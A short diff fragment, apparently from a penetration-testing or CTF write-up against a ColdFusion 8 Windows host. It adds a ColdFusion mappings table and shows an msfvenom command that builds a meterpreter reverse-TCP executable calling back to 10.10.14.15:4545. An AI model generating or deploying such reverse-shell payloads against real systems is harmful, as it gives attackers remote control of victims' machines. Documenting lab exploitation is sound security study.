@@ -1,4 +1,7 @@
-μμ
+Active ColdFusion Mappings
+Actions 	Logical Path 	Directory Path
+  	/CFIDE  	C:\ColdFusion8\wwwroot\CFIDE 
+Edit Delete   	/gateway  	C:\ColdFusion8\gateway\cfc  
 
 hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4545 -f exe -o meterpreter.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
